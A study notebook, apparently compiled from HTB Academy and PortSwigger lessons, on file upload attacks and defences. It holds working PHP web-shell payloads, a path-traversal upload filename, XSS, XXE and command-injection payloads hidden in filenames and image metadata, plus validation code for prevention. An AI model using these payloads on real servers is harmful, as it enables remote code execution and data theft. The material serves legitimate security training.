> This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.
> 

> Let's take a basic example to demonstrate this. The `file` command on Unix systems finds the file type through the MIME type. If we create a basic file with text in it, it would be considered as a text file, as follows:
> 
> 
> ```php
> 0xR3Y4D@htb[/htb]$ echo "this is a text file" > text.jpg 
> 0xR3Y4D@htb[/htb]$ file text.jpg 
> text.jpg: ASCII text
> ```
> 
> As we see, the file's MIME type is `ASCII text`, even though its extension is `.jpg`. However, if we write `GIF8` to the beginning of the file, it will be considered as a `GIF` image instead, even though its extension is still `.jpg`:
> 
> ```php
> 0xR3Y4D@htb[/htb]$ echo "GIF8" > text.jpg 
> 0xR3Y4D@htb[/htb]$file text.jpg
> text.jpg: GIF image data
> ```
> 
> > Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploaded file:
> > 
> > 
> > ```php
> > $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
> > 
> > if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
> >     echo "Only images are allowed";
> >     die();
> > }
> > ```
> > 
> 
> Let's try to repeat our last attack, but now with an exercise that tests both the Content-Type header and the MIME type:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2030.png)
> 
> Once we forward our request, we notice that we get the error message `Only images are allowed`. Now, let's try to add `GIF8` before our PHP code to try to imitate a GIF image while keeping our file extension as `.php`, so it would execute PHP code regardless:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2031.png)
> 
> This time we get `File successfully uploaded`, and our file is successfully uploaded to the server:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2032.png)
> 
> ---
> 

## Bypass **Preventing file execution in user-accessible directories**

- you can add `../` before the file name to change the upload directory to another location that is not configured to be not executable

```php
<SNIP>
-----------------------------113761443433615296422317965594
Content-Disposition: form-data; name="avatar"; filename="..%2fcmd.php"
Content-Type: application/x-php

<?php
system($_GET['cmd']);
?>
<SNIP>
```

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

```jsx
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.

You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently.

---

### **Overriding the server configuration**

As we discussed in the previous section, servers typically won't execute files unless they have been configured to do so. For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.

Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

- **Try to overwrite the file `.htaccess`**

---

# **File upload vulnerabilities**

In this section, you'll learn how simple file upload functions can be used as a powerful vector for a number of high-severity attacks. We'll show you how to bypass common defense mechanisms in order to upload a web shell, enabling you to take full control of a vulnerable web server. Given how common file upload functions are, knowing how to test them properly is essential knowledge.

![https://portswigger.net/web-security/file-upload/images/file-upload-vulnerabilities.jpg](https://portswigger.net/web-security/file-upload/images/file-upload-vulnerabilities.jpg)

### **Labs**

If you're already familiar with the basic concepts behind file upload vulnerabilities and just want to get practicing, you can access all of the labs in this topic from the link below.

[View all file upload labs](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)

## **What are file upload vulnerabilities?**

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

## **What is the impact of file upload vulnerabilities?**

The impact of file upload vulnerabilities generally depends on two key factors:

- Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.
- What restrictions are imposed on the file once it has been successfully uploaded.

In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as `.php` and `.jsp`) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server.

If the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name. If the server is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), this could mean attackers are even able to upload files to unanticipated locations.

Failing to make sure that the size of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.

## **How do file upload vulnerabilities arise?**

Given the fairly obvious dangers, it's rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.

For example, they may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it's also easy to accidentally omit more obscure file types that may still be dangerous.

In other cases, the website may attempt to check the file type by verifying properties that can be easily manipulated by an attacker using tools like Burp Proxy or Repeater.

Ultimately, even robust validation measures may be applied inconsistently across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.

Later in this topic, we'll teach you how to [exploit a number of these flaws](https://portswigger.net/web-security/file-upload#exploiting-flawed-validation-of-file-uploads) to upload a web shell for remote code execution. We've even created some interactive, deliberately vulnerable labs so that you can practice what you've learned against some realistic targets.

## **How do web servers handle requests for static files?**

Before we look at how to exploit file upload vulnerabilities, it's important that you have a basic understanding of how servers handle requests for static files.

Historically, websites consisted almost entirely of static files that would be served to users when requested. As a result, the path of each request could be mapped 1:1 with the hierarchy of directories and files on the server's filesystem. Nowadays, websites are increasingly dynamic and the path of a request often has no direct relationship to the filesystem at all. Nevertheless, web servers still deal with requests for some static files, including stylesheets, images, and so on.

The process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types. What happens next depends on the file type and the server's configuration.

- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
- If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an [example](https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files) of this in our [information disclosure](https://portswigger.net/web-security/information-disclosure) learning materials.

### **Tip**

The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

Now that you're familiar with the key concepts, let's look at how you can potentially exploit these kinds of vulnerabilities.

## **Exploiting unrestricted file uploads to deploy a web shell**

From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

### **Web shell**

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

**LAB**

**APPRENTICE[Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)**

Solved

A more versatile web shell may look something like this:

```
<?php echo system($_GET['command']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows:

```
GET /example/exploit.php?command=id HTTP/1.1
```

## **Exploiting flawed validation of file uploads**

In the wild, it's unlikely that you'll find a website that has no protection whatsoever against file upload attacks like we saw in the previous lab. But just because defenses are in place, that doesn't mean that they're robust.

In this section, we'll look at some ways that web servers attempt to validate and sanitize file uploads, as well as how you can exploit flaws in these mechanisms to obtain a web shell for remote code execution.

### **Flawed file type validation**

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name, address, and so on, but is not suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is the preferred approach.

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.

**LAB**

**APPRENTICE[Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)**

Solved

### **Preventing file execution in user-accessible directories**

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

```
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

### **Tip**

Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.

**LAB**

**PRACTITIONER[Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)**

Not solved

You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently.

---

# **Limited File Uploads**

<aside>
💡 Even if we are dealing with a limited (i.e., non-arbitrary) file upload form, which only allows us to upload specific file types, we may still be able to perform some attacks on the web application.

</aside>

> Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.
> 

## File Upload ⇒ XSS

<aside>
💡 Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

</aside>

> The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.
> 

> Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:
> 
> 
> ```php
> 0xR3Y4D@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
> 0xR3Y4D@htb[/htb]$ exiftool HTB.jpg
> ...SNIP...
> Comment                         :  "><img src=1 onerror=alert(window.origin)>
> ```
> 
> We can see that the `Comment` parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
> 

## File Upload ⇒ XXE

> Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
> 
> 
> ```php
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
> <svg>&xxe;</svg>
> ```
> 
> Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source. Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.
> 

> To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
> 
> 
> ```php
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
> <svg>&xxe;</svg>
> ```
> 
> Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.
> 

## **Other Upload Attacks**

<aside>
💡 there are a few other techniques and attacks worth mentioning, as they may become handy in some web penetration tests or bug bounty tests.

</aside>

### **Injections in File Name**

> A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.
> 

> For example, if we name a file `file$(whoami).jpg` or `file`whoami`.jpg` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution. You may refer to the [Command Injections](https://academy.hackthebox.com/module/details/109) module for more information.
> 

> Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is disabled to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
> 

### **Upload Directory Disclosure**

> we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.
> 

### **Windows-specific Attacks**

> One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.
> 

> For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.
> 

# **Preventing File Upload Vulnerabilities**

<aside>
💡 what we can do to ensure that our file upload functions are securely coded and safe against exploitation and what action points we can recommend for each type of file upload vulnerability.

</aside>

## **Extension Validation**

> While whitelisting extensions is always more secure, as we have seen previously, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. `shell.php.jpg`). The following example shows how this can be done with a PHP web application, but the same concept can be applied to other frameworks:
> 
> 
> ```php
> $fileName = basename($_FILES["uploadFile"]["name"]);
> 
> // blacklist test
> if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
> 
> // whitelist test
> if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
> ```
> 
> We see that with blacklisted extension, the web application checks `if the extension exists anywhere within the file name`, while with whitelists, the web application checks `if the file name ends with the extension`. Furthermore, we should also apply both back-end and front-end file validation. Even if front-end validation can be easily bypassed, it reduces the chances of users uploading unintended files, thus potentially triggering a defense mechanism and sending us a false alert.
> 

## **Content Validation**

> The following example shows us how we can validate the file extension through whitelisting, and validate both the File Signature and the HTTP Content-Type header, while ensuring both of them match our expected file type:
> 
> 
> ```php
> $fileName = basename($_FILES["uploadFile"]["name"]);
> $contentType = $_FILES['uploadFile']['type'];
> $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
> 
> // whitelist test
> if (!preg_match('/^.*\.png$/', $fileName)) {
>     echo "Only PNG images are allowed";
>     die();
> }
> 
> // content test
> foreach (array($contentType, $MIMEtype) as $type) {
>     if (!in_array($type, array('image/png'))) {
>         echo "Only SVG images are allowed";
>         die();
>     }
> }
> ```
> 
> Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.
> 
> In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.
> 
> Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.
> 
> This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
> 
> ```bash
> exiftool -comment="<?php system($_GET['cmd']);?>" image.png -o img_webshell.php
> ```
> 

### **Exploiting file upload race conditions**

Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code.

# step-by-step process.

1. **The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand)we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as `server` or `x-powered-by` can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.**
2. **Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.**
3. **We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we
can base further testing on.**
    - **An important Gobuster switch here is the `-x` switch, which can be used to look for files with specific extensions. For example, if you added `-x php,txt,html` to your Gobuster command, the tool would append `.php`, `.txt`, and `.html` to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing
    the name of uploaded files**.
4. **Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.**

---

<aside>
🔥 **Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:**

1. **If you can successfully upload a file with a totally invalid file extension (e.g. `testingimage.invalidfileextension`) then the chances are that the server is using an extension *blacklist* to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.**
2. **Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.**
3. **As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.**
4. **Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.**
</aside>